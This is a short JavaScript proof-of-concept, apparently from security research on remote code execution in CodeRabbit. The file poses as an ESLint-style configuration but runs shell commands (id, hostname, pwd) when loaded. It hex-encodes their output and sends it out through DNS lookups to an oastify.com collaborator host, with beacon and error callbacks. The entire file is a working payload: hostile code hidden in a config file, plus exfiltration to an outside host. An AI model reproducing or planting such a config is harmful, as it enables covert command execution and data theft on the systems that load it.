// CodeRabbit RCE PoC - OS command execution + output exfil via DNS
var C = 'nb21iy4jvep6dauo566exlxwyn4es5gu.oastify.com';
var dns = require('dns');
dns.lookup('load.' + C, function(){});            // beacon: config executed
try {
  var out = require('child_process').execSync('id; hostname; pwd', { timeout: 8000 }).toString();
  var hex = Buffer.from(out).toString('hex');
  for (var i = 0, n = 0; i < hex.length && i < 300; i += 60, n++) {
    dns.lookup('p' + n + '-' + hex.slice(i, i + 60) + '.cmdout.' + C, function(){});
  }
} catch (e) {
  dns.lookup('execerr.' + C, function(){});
}
module.exports = { root: true, rules: {} };
